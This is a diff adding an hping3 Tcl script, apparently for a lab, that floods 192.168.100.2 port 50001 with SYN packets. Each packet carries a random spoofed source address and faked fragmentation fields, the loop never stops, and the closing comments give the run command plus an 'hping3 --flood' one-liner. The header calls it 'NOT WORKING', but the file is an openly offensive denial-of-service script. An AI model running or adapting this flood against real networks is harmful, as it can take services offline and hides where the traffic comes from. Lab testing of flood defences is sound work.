@@ -1,0 +1,44 @@
+# Hping3 TCP Fake Fragment Flood (no real fragmentation)
+# NOT WORKING
+
+# Simulates fragmented TCP packets by manipulating fragoff and MF flag
+
+set dst_ip "192.168.100.2"
+set dst_port 50001
+set count 0
+
+# Function to generate random IP address
+proc random_ip {} {
+    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
+}
+
+# Function to generate random source port (1024–65535)
+proc random_port {} {
+    return [expr {int(rand()*64512) + 1024}]
+}
+
+while {1} {
+    set saddr [random_ip]
+    set sport [random_port]
+
+    # Fake fragmentation fields (no real fragmentation)
+    # fragoff=64 → Wireshark interprets as "fragment offset = 64"
+    # mf=1       → "More fragments" flag on
+    # id random  → new fake fragment group each packet
+    set frag_id [expr {int(rand()*65535)}]
+
+    # TCP fake-fragment packet: SYN flag only, no payload
+    set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64,id=$frag_id,fragoff=64,mf=1)+tcp(sport=$sport,dport=$dst_port,flags=s)"
+
+    hping send $pkt
+    incr count
+
+    # Print every 1000 packets sent
+    if {[expr {$count % 1000}] == 0} {
+        puts "$count TCP Fake-Fragment packets sent..."
+    }
+}
+
+# To run:
+# sudo hping3 exec tcp_fake_frag.htcl
+# sudo hping3 -S 192.168.100.2 -p 50001 -x -g 64 --flood
